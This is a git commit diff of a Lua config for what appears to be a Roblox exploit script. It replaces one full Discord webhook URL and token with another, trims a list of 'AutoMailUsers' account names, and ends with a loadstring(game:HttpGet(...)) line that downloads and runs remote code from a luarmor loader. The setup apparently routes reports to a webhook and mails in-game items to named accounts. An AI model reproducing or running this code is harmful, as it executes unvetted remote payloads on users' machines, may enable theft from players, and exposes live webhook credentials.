329571961762205a8331cb4138d760152918e85e
Ocean <156903851+Oceandek@users.noreply.github.com>
2024-10-16 12:56:30 +0200

    Update pir.lua

--- pir.lua
+++ pir.lua
@@ -1,6 +1,6 @@
 getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1295468742238670969/4NPB2R3ex-DyIOgKLlxvPictRJ5BvCiZxvc-9526X_7JY6-h7mPbo8NzMxyzOqRs28y5",
+    ["Webhook"] = "https://discord.com/api/webhooks/1296064179429572709/sYcqrh7nTH-4OnDyJv6F0sX4Mxw8lvqGwmomAGd62A_LekmHEC2npdEe5sgSb6zYvqJC",
     ["UserID"] = "683695252481245216",
-    ["AutoMailUsers"] = {"Fastmocean", "Fastmocean1", "Sharkzsploits"},
+    ["AutoMailUsers"] = {"Fastmocean"},
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e03750830408cc7f721a4c590b9f0b62.lua"))()
